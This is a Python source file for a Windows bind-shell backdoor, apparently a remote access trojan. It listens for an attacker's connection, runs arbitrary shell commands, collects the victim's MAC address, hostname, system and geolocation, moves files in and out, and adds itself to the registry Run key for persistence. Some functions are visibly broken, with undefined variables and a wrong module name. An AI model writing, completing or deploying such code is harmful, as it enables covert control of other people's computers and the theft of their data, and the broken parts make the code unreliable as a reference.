import socket
import time
import subprocess
import os
import sys
import uuid
import requests
import json
import platform
import winreg


class BindShell:
    def __init__(self):
        try:
            # CREATE TCP SOCKET
            self.tcp_sock = socket.socket(
                socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)

            self.HOST = socket.gethostbyname(
                socket.gethostname())

            self.PORT = 5000
            self.BUFF_SIZE = 2048

            # BIND SOCKET TO THE ADDRESS (HOST, PORT)
            self.tcp_sock.bind((self.HOST, self.PORT))

            # LISTEN FOR CONNECTIONS
            self.tcp_sock.listen()
            print(
                f"[+]LISTENING ON [HOST: {self.HOST}] AND [PORT: {self.PORT}][+]")

            self.socket_init()
        except socket.error as e:
            print(f"[+][ERROR]: {e}[+]")

    # CREATE PERSISTENCE
    def AddToStartup(f_name, path):

        # Combine Path and Filename
        address = os.path.join(path, f_name)

        # Key To Change: HKEY_CURRENT_USER
        # Key Value: Software\Microsoft\Windows\CurrentVersion\Run
        key = reg.HKEY_CURRENT_USER
        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

        # Opening Key To Make Changes
        open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)

        # Modifiy The Key
        reg.SetValueEx(open, "any_name", 0, reg.REG_SZ, address)

        # Closing
        reg.CloseKey(open)
    # CREATE PERSISTENCE

    # SEND MAC ADDRESS
    @property
    def mac(self):
        try:
            mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
            return mac
        except Exception as e:
            return e

    # SEND HOSTNAME
    @property
    def hostname(self):
        try:
            hostname = socket.getfqdn(socket.gethostname()).strip()
            return hostname
        except Exception as e:
            return e

    # SEND LOCATION
    @property
    def location(self):
        try:
            public_ip = requests.get("https://api.ipify.org/").text
            data = requests.get(
                f"https://freegeoip.app/json/{public_ip}").text

            json_data = json.loads(data)

            ip_public = json_data["ip"]
            country_code = json_data["country_code"]
            country_name = json_data["country_name"]
            region_code = json_data["region_code"]
            region_name = json_data["region_name"]
            city = json_data["city"]
            zip_code = json_data["zip_code"]
            time_zone = json_data["time_zone"]
            latitude = json_data["latitude"]
            longitude = json_data["longitude"]
            metro_code = json_data["metro_code"]

            return f"ip_pubic: {ip_public}\ncountry_code: {country_code}\ncountry_name: {country_name}\nregion_code: {region_code}\nregion_name: {region_name}\ncity: {city}\nzip_code: {zip_code}\ntime_zone: {time_zone}\nlatitude: {latitude}\nlongitude: {longitude}\nmetro_code: {metro_code}"
        except Exception as e:
            return e

    # SEND MACHINE
    @property
    def machine(self):
        try:
            return platform.system()
        except Exception as e:
            return e

    # SEND CORE
    @property
    def core(self):
        try:
            return platform.machine()
        except Exception as e:
            return e

        # SOCKET INIT

    # SOCKET INIT
    def socket_init(self):
        # ACCEPT CONNECTION (PROGRAM WILL WAIT ON ACCEPT UNTIL IT RECV A CONNECTION THEN WE WILL JUMP TO MAIN() FUNCTION)
        # CLIENT_SOCKET IS A NEW SOCKET OBJECT ABLE TO SEND&RECV DATA ON THE CONNECTION
        # CLIENT_ADDRESS IS THE ADDRESS BOUND TO THE SOCKET
        self.tcp_sock.settimeout(1800)
        self.client_socket, self.client_address = self.tcp_sock.accept()

        print(
            f"[+]ACCEPTED CONNECTION [ATTACK_IP: {self.client_address[0]}] AND [ATTCKER_PORT: {self.client_address[1]}][+]")

        self.main()

    # SEND MESSAGE
    def send_msg(self, msg):
        # CONVERT STRING(MSG) INTO UTF-8 BYTES
        msg = bytes(f"{msg}\n\n[CIBLE]: {os.getcwd()}> ", 'utf-8')
        send = self.client_socket.sendall(msg)

        # RETURN 'NONE' IF SENDALL IS SUCCESSFUL
        return send

    # RECEIVED MESSAGE
    def recv_msg(self):
        recv = self.client_socket.recv(self.BUFF_SIZE)

        # RETURN VALUE IS A BYTES OBJECT REPRESENTING THE DATA RECEIVED
        return recv

    def grab_command(self):
        # Extracting filename From Command
        file_name = msg[5:]

        # Getting File Size
        file_size = os.path.getsize(file_name)

        # Opening File To Read
        # File Will Be Sent In Small Chunks Of Data
        with open(file_name, "r") as file:
            # Chunks Sent = 0
            c = 0

            # Starting Time
            start_time = time.time()

            # Running Loop Until c < file_size
            while c < file_size:

                # Read 1024 Bytes
                data = file.read()

                # If No Bytes, Stop
                if not (data):
                    break

                # Send Bytes
                print(data)

                # Chunks Sent += Length Of Data
                c += len(data)

            # Ending Time
            end_time = time.time()

        # Sending File Name
        # Sending File Size
        # Sending File Transferred Time
        self.send_msg(
            f"[+]FILE NAME: {file_name}[+]\n[+]FILE SIZE: {str(file_size/1024)} KB[+]\n[+]FILE TRANSFERRED TIME: {end_time - start_time}s[+]")

    def transfer_command(self):
        # Recieving Name Of File To Be Transferred
        file_name = s.recv(1024).decode('utf-8')

        # Sending Response
        s.send('OK'.encode('utf-8'))

        # Recieving Size Of File To Be Transferred
        file_size = s.recv(1024).decode('utf-8')

        # Sending Response
        s.send('OK'.encode('utf-8'))

        # Opening File For Writing
        with open(file_name, "wb") as file:

            # Chunks Recieved
            c = 0

            # Starting Time
            start_time = time.time()

            # Running Until c < int(file_size)
            while c < int(file_size):

                # Recieve 1024 Bytes
                data = s.recv(1024)

                # If No Data, Stop
                if not (data):
                    break

                # Write Bytes To File
                file.write(data)

                # Chunks Added
                c += len(data)

            # Ending Time
            end_time = time.time()

    def exec(self, msg):
        try:
            if msg[:5] == "data.":
                if msg.startswith("data.addr_mac"):
                    self.send_msg(self.mac)
                elif msg.startswith("data.hostname"):
                    self.send_msg(self.hostname)
                elif msg.startswith("data.machine"):
                    self.send_msg(self.machine)
                elif msg.startswith("data.core"):
                    self.send_msg(self.core)
                elif msg.startswith("data.location"):
                    self.send_msg(self.location)
                else:
                    self.send_msg(
                        f"[+]'{msg.split(' ')[0]}' is not recognized as an internal or external function or operable program")
            elif msg.startswith("startup"):
                # CREATE PERSISTENCE FOR OUR REVERSE TCP SHELL EXE ON WINDOWS
                self.AddToStartup("", os.getcwd())
            elif msg.startswith("grab"):
                self.grab_command()
            elif msg.startswith("transfer"):
                self.transfer_command()
            elif msg.startswith("screenshot"):
                pass
            elif msg.startswith("streamshot"):
                pass
            elif msg.startswith("streammic"):
                pass
            else:
                # NORMAL COMMAND PROMPT COMMANDS USING THE SHELL
                tsk = subprocess.Popen(args=msg, shell=True, stdin=subprocess.PIPE,
                                       stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                stdout, stderr = tsk.communicate()

                # RESULT FROM SUBPROCESS SHELL STDOUT DECODED IN UTF8
                result = stdout.decode('utf-8')

                if msg.startswith("cd"):
                    os.chdir(msg[3:])
                    self.send_msg("[+]REVERSESHELL CHANGED DIRECTORY[+]")
                elif msg.startswith("exit"):
                    # CLOSE CLIENT SOCKET
                    self.client_socket.close()

                    # CLOSE CURRENT SOCKET
                    self.tcp_sock.close()

                    # CLOSE SYSTEM
                    sys.exit()
                else:
                    # SEND RESULT TO CLIENT
                    self.send_msg(result)
        except Exception as e:
            self.send_msg(f"[+][ERROR]: {e}[+]")

    # RUNNING SOCKET
    def main(self):
        # SEND CONNECTION MESSAGE TO CONNECTED CLIENT
        if self.send_msg("[+]CONNECTION ESTABLISHED[+]") != None:
            print("[+]Error Has Occured[+]")

        # MAIN PART OF OUR PROGRAM, WILL RUN A CONTINOUS WHILE LOOP
        while True:
            try:
                msg = ""
                chunk = self.recv_msg()
                msg += chunk.strip().decode("utf-8")

                # HEADQUARTERS(exec) FOR COMMANDS, FUNCTION, AND SO ON USING THE RECEIVED MESSAGE
                self.exec(msg)
            except Exception as e:
                self.send_msg(e)

                # CLOSE CLIENT SOCKET
                self.client_socket.close()

                # GO TO SOCKET_INIT() METHOD AND LISTEN FOR CONNECTION
                self.socket_init()


if __name__ == "__main__":
    BindShell()
